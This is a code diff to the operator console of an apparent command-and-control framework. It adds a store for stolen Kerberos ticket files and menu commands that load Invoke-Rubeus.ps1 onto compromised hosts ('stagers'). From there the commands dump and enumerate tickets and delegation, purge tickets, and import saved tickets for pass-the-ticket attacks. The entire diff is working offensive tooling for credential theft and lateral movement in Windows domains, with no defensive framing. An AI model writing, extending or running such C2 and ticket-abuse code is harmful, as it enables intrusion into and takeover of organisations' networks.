@@ -4,6 +4,7 @@ import threading
 import queue
 import uuid 
 import os
+import sys
 import time
 import payloadgen
 from myconstant import myconstant_networking,myconstant,mybuildin_cmd
@@ -51,7 +52,23 @@ class ps_loader():
             all_of_it = f.read()
             return all_of_it
 
+class tgt_loader():
+    def __init__(self):
+        self.DBPATH = "TGTDB\\"
+        self.tgtfiles = [f for f in os.listdir(self.DBPATH) if os.path.isfile(os.path.join(self.DBPATH, f))]
 
+    def load_tgt(self,filename):
+        if filename not in self.tgtfiles:
+            print("No available ...")
+            return
+
+        with open(self.DBPATH + filename,"rb") as f:
+            all_of_it = f.read()
+            return all_of_it
+    
+    def save_tgt(self,filename,data):
+        with open(self.DBPATH + filename,"wb") as f:
+            f.write(data)
 
 class mymainclass():
 
@@ -959,7 +976,7 @@ class mymainclass():
                     
                     continue
 
-                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_KERBER:
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_RUBEUS_KERBER:
                     #set auto compete to stager uuid
                     setautocomplete(self.__t_myserver.get_running_stager())
 
@@ -984,7 +1001,7 @@ class mymainclass():
                     self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.KERBER)
                     continue
 
-                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_ASREP:
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_RUBEUS_ASREP:
                     #set auto compete to stager uuid
                     setautocomplete(self.__t_myserver.get_running_stager())
 
@@ -1013,6 +1030,130 @@ class mymainclass():
                         self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.ARSREP)
 
                     continue
+
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_RUBEUS_TRIAGE:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+                    
+                    if ("Invoke-Rubeus.ps1" not in self.__t_myserver.get_psloadlist(user_input_stager)):
+
+                        #load ps
+                        t_psloader = ps_loader()
+                        t_result = t_psloader.load_ps("Invoke-Rubeus.ps1")
+                        #call psrun with tag psload
+                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+                        #update the list
+                        self.__t_myserver.add_psloadlist(user_input_stager,"Invoke-Rubeus.ps1")
+                    
+                    else:
+                        print("Rubeus already loaded")
+
+                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.TRIAGE)
+                    continue
+
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_RUBEUS_DELEG:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+                    
+                    if ("Invoke-Rubeus.ps1" not in self.__t_myserver.get_psloadlist(user_input_stager)):
+
+                        #load ps
+                        t_psloader = ps_loader()
+                        t_result = t_psloader.load_ps("Invoke-Rubeus.ps1")
+                        #call psrun with tag psload
+                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+                        #update the list
+                        self.__t_myserver.add_psloadlist(user_input_stager,"Invoke-Rubeus.ps1")
+                    
+                    else:
+                        print("Rubeus already loaded")
+
+                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.DELEG)
+                    continue
+
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_RUBEUS_PURGE:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+                    
+                    if ("Invoke-Rubeus.ps1" not in self.__t_myserver.get_psloadlist(user_input_stager)):
+
+                        #load ps
+                        t_psloader = ps_loader()
+                        t_result = t_psloader.load_ps("Invoke-Rubeus.ps1")
+                        #call psrun with tag psload
+                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+                        #update the list
+                        self.__t_myserver.add_psloadlist(user_input_stager,"Invoke-Rubeus.ps1")
+                    
+                    else:
+                        print("Rubeus already loaded")
+
+                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.PURGE)
+                    continue
+
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_RUBEUS_IMPORT:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+                    
+                    t_tgt_loader = tgt_loader()
+                    #set auto compete for filename
+                    setautocomplete(t_tgt_loader.tgtfiles)
+                    user_input_tgtfile = input("Please enter tgtfiles to load: ")
+                    user_input_confirm = input("y to continue: ")
+                    if user_input_confirm != "y":
+                        continue
+
+                    if ("Invoke-Rubeus.ps1" not in self.__t_myserver.get_psloadlist(user_input_stager)):
+
+                        #load ps
+                        t_psloader = ps_loader()
+                        t_result = t_psloader.load_ps("Invoke-Rubeus.ps1")
+                        #call psrun with tag psload
+                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+                        #update the list
+                        self.__t_myserver.add_psloadlist(user_input_stager,"Invoke-Rubeus.ps1")
+                    
+                    else:
+                        print("Rubeus already loaded")
+
+                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.PTT.format(decoder.b64_encode_byte(t_tgt_loader.load_tgt(user_input_tgtfile))))
+                    continue
+
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_RUBEUS_SAVE:
+                    #set auto compete to stager uuid
+                    #local command
+                    print("Please enter the b64 tgt: ")
+                    user_input_tgt = sys.stdin.read()
+                    user_b64 = ''.join(user_input_tgt.split())
+
+                    user_input_filename = input("Please enter the file name: ")
+                    user_input_confirm = input("y to continue: ")
+                    if user_input_confirm != "y":
+                        continue
+                    t_tgt_loader = tgt_loader()
+                    t_tgt_loader.save_tgt(user_input_filename + ".kirbi",decoder.b64_decode(user_b64))
+                    continue
+
 
                 if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_MSF:
                     #disable verbose
